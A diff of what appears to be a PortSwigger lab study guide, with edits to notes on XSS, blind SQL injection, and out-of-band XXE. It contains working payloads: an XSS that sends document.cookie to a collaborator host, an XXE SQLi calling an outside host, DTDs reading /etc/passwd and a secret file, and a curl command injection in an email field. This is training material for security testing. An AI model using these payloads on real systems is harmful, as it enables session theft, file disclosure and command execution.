@@ -337,7 +337,7 @@ https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocume
 >Lab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the **Assignable protocol with location** ```javascript``` exploit ***identified*** by [PortSwigger XSS research](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location). In the payload is the ```%0a``` representing the ASCII newline character.  
 
 ```html
-<script>location.protocol='javascript';</script>#%0adocument.location='http://0xyjdsa2etgbxef5lwgj5rj6mxsoge43.oastify.com/?p='+document.cookie//&context=html
+<script>location.protocol='javascript';</script>#%0adocument.location='http://COLLABORATOR.NET/?p='+document.cookie//&context=html
 ```  
 
 ![XSS protocol location](images/xss-protocol-location.png)  
@@ -1356,11 +1356,13 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
   
 ![SQLi XXE](images/sqli-XXE.png)  
 
->Additional SQLi payload with XML for reference with ```||``` the SQL concatenation operator to concatenate two expressions that evaluate two character data types or to numeric data type.  
+>Additional SQLi payload with XML for reference with ```||``` the SQL concatenation operator to concatenate two expressions that evaluate two character data types or to numeric data type and do some obfuscating.  
 
 ```
-'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % umiyp SYSTEM "http://Collaborator.oasti'||'fy.com/">%umiyp;]>'),'/l') from dual)||'
+'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % umiyp SYSTEM "http://Collaborat'||'OR.COM/">%umiyp;]>'),'/l') from dual)||'
 ```  
+
+[OAST - Out-of-band Application Security Testing](https://portswigger.net/burp/application-security-testing/oast)  
 
 [PortSwigger Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)  
   
@@ -1713,7 +1715,7 @@ X-Original-URL: /admin
 
 ### DTD Blind Out-of-band  
 
->On the exploit server change the hosted file name to ```/exploit.dtd``` as the exploit file with **Document Type Definition (DTD)** extension, containing the following payload.  
+>On the exploit server change the hosted file name to ```/exploit.dtd``` as the exploit file with **Document Type Definition (DTD)** extension, containing the following payload. The ```&#x25;``` is the Unicode hex character code for percent sign ```%```.  
 
 ```xml
 <!ENTITY % file SYSTEM "file:///home/carlos/secret">
@@ -1745,9 +1747,9 @@ X-Original-URL: /admin
   
 ### DTD Blind Error messages  
 
->If the out of band to Collaborator payload above do not work test if the target will call a ```exploit.dtd``` with invalid file reference and return in error the message to response.  
+>Trigger XML parsing errors in such a way that the error messages contain sensitive data. If the out of band to Collaborator payload above do not work test if the target will call a ```exploit.dtd``` file with invalid reference and return response in an error message.  
 
->Hosted on exploit server the ```/exploit.dtd``` file and body contents.  
+>Hosted on exploit server the ```/exploit.dtd``` file and body contents to ```file:///invalid/``` path.  
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -2408,7 +2410,7 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 [Python Scripts](#python-scripts)  
 [Focus Scanning](#focus-scanning)  
 [Approach](#approach)  
-[YouTube Channels](#youtube)  
+[YouTube Channels](#youtube-training-playlist)  
 
 ## Obfuscation  
 
